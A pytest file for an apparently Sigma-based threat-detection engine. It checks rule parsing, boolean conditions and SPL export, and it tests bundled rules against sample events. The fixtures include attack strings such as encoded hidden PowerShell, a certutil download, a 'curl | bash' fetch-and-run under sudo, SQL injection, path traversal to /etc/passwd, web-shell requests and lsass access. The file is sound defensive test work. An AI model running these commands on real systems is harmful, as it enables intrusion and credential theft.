import pytest

from intellidetect.engine import RULES_DIR
from intellidetect.sigma import SigmaError, SigmaRule, load_sigma_dir

from .conftest import make_event

BASE = {
    "title": "t",
    "tags": ["attack.execution", "attack.t1059.001"],
    "logsource": {"category": "process_creation"},
    "level": "high",
}


def rule(detection):
    return SigmaRule({**BASE, "detection": detection})


def proc(cmd="", image="C:\\a\\x.exe", parent=""):
    return make_event(kind="process_create", source="sysmon",
                      data={"command_line": cmd, "image": image, "parent_image": parent})


def test_metadata_is_extracted_from_tags():
    r = rule({"s": {"Image|endswith": "x.exe"}, "condition": "s"})
    assert (r.tactic, r.technique, r.severity, r.kind) == ("Execution", "T1059.001", "high", "process_create")


def test_and_not_condition():
    r = rule({"sel": {"CommandLine|contains": "evil"}, "flt": {"Image|startswith": "C:\\ok"},
              "condition": "sel and not flt"})
    assert r.matches(proc("evil", image="C:\\bad\\a.exe"))
    assert not r.matches(proc("evil", image="C:\\ok\\a.exe"))
    assert not r.matches(proc("fine"))


def test_or_and_parentheses_precedence():
    r = rule({"a": {"CommandLine|contains": "a"}, "b": {"CommandLine|contains": "b"},
              "c": {"Image|endswith": "c.exe"}, "condition": "(a or b) and c"})
    assert r.matches(proc("b", image="c.exe"))
    assert not r.matches(proc("b", image="d.exe"))


def test_quantifiers():
    det = {"sel_one": {"CommandLine|contains": "one"}, "sel_two": {"CommandLine|contains": "two"}}
    any_of = rule({**det, "condition": "1 of sel_*"})
    all_of = rule({**det, "condition": "all of sel_*"})
    both = proc("one two")
    assert any_of.matches(proc("one")) and not all_of.matches(proc("one"))
    assert all_of.matches(both)
    assert rule({**det, "condition": "1 of them"}).matches(proc("two"))


def test_list_of_maps_is_or():
    r = rule({"sel": [{"Image|endswith": "psexec.exe"}, {"CommandLine|contains": "psexec"}], "condition": "sel"})
    assert r.matches(proc(image="C:\\t\\psexec.exe"))
    assert r.matches(proc("run psexec now"))
    assert not r.matches(proc("nothing"))


def test_kind_mismatch_never_matches():
    r = rule({"sel": {"CommandLine|contains": "x"}, "condition": "sel"})
    assert not r.matches(make_event(kind="dns_query", data={"command_line": "x"}))


@pytest.mark.parametrize("condition", ["sel and", "(sel", "nope", "1 of missing_*", "sel sel"])
def test_bad_conditions_raise(condition):
    with pytest.raises(SigmaError):
        rule({"sel": {"Image": "x"}, "condition": condition})


def test_unsupported_logsource_raises():
    with pytest.raises(SigmaError):
        SigmaRule({**BASE, "logsource": {"category": "registry_set"},
                   "detection": {"s": {"a": "b"}, "condition": "s"}})


def test_all_bundled_rules_load_and_are_well_formed():
    rules = load_sigma_dir(RULES_DIR / "sigma")
    assert len(rules) >= 12
    ids = [r.id for r in rules]
    assert len(set(ids)) == len(ids)
    for r in rules:
        assert r.technique and r.tactic and r.description and r.uuid


def by_id(rule_id):
    return next(r for r in load_sigma_dir(RULES_DIR / "sigma") if r.id == rule_id)


POSITIVE = {
    "IDT-SG-001": proc("powershell.exe -w hidden -enc JAB", image="C:\\Windows\\powershell.exe"),
    "IDT-SG-002": proc("cmd.exe /c x", image="C:\\Windows\\cmd.exe", parent="C:\\Office\\WINWORD.EXE"),
    "IDT-SG-003": proc("certutil -urlcache -f http://x/p", image="C:\\Windows\\certutil.exe"),
    "IDT-SG-005": proc("psexec \\\\srv cmd", image="C:\\t\\psexec.exe"),
    "IDT-SG-006": proc("net user /domain"),
    "IDT-SG-007": proc("schtasks.exe /create /tn x", image="C:\\Windows\\schtasks.exe"),
}
NEGATIVE = {
    "IDT-SG-001": proc("powershell.exe -NoProfile -Command Get-Service", image="C:\\p\\powershell.exe"),
    "IDT-SG-002": proc("cmd.exe /c x", image="C:\\Windows\\cmd.exe", parent="C:\\Windows\\explorer.exe"),
    "IDT-SG-003": proc("certutil -verify cert.cer", image="C:\\Windows\\certutil.exe"),
    "IDT-SG-006": proc("ipconfig /all"),
    "IDT-SG-007": proc("schtasks.exe /query", image="C:\\Windows\\schtasks.exe"),
}


@pytest.mark.parametrize("rule_id", POSITIVE)
def test_bundled_rule_fires_on_attack(rule_id):
    assert by_id(rule_id).matches(POSITIVE[rule_id])


@pytest.mark.parametrize("rule_id", NEGATIVE)
def test_bundled_rule_ignores_benign(rule_id):
    assert not by_id(rule_id).matches(NEGATIVE[rule_id])


def test_lsass_rule_filters_system_processes():
    r = by_id("IDT-SG-004")

    def access(src):
        return make_event(kind="process_access", source="sysmon",
                          data={"image": src, "target_image": "C:\\Windows\\System32\\lsass.exe",
                                "granted_access": "0x1410"})

    assert r.matches(access("C:\\Users\\a\\AppData\\Temp\\p.exe"))
    assert not r.matches(access("C:\\Windows\\System32\\svchost.exe"))


def test_web_and_sudo_and_dns_rules():
    def web(url, path=None, query=""):
        return make_event(kind="http_request", source="apache",
                          data={"url": url, "uri_path": path or url.split("?")[0], "uri_query": query})

    assert by_id("IDT-SG-008").matches(web("/p?id=1' or 1=1--"))
    assert not by_id("IDT-SG-008").matches(web("/products?id=5"))
    assert by_id("IDT-SG-009").matches(web("/d?f=../../../etc/passwd"))
    assert by_id("IDT-SG-010").matches(web("/uploads/shell.php", "/uploads/shell.php"))
    assert by_id("IDT-SG-010").matches(web("/x.php?cmd=id", "/x.php", "cmd=id"))
    assert not by_id("IDT-SG-010").matches(web("/index.php", "/index.php"))

    def sudo(cmd):
        return make_event(kind="sudo", data={"command": cmd})

    assert by_id("IDT-SG-011").matches(sudo("/bin/bash -c 'curl -s http://x/a.sh | bash'"))
    assert not by_id("IDT-SG-011").matches(sudo("/usr/bin/curl -fsSL https://x -o /tmp/x"))
    assert by_id("IDT-SG-012").matches(make_event(kind="dns_query", data={"query": "update-sync.top"}))
    assert not by_id("IDT-SG-012").matches(make_event(kind="dns_query", data={"query": "github.com"}))


def test_spl_export_contains_logic():
    spl = by_id("IDT-SG-001").to_spl(index="winlogs")
    assert spl.startswith("index=winlogs ")
    assert "EventCode=1" in spl and "| where" in spl and "| table" in spl
    assert 'like(lower(Image), "%\\powershell.exe")' in spl or "powershell.exe" in spl
    assert "AND" in spl


def test_spl_export_handles_not_and_quantifiers():
    spl = by_id("IDT-SG-004").to_spl()
    assert "NOT" in spl and "EventCode=10" in spl
    for rule in load_sigma_dir(RULES_DIR / "sigma"):
        assert rule.to_spl()  # every bundled rule exports
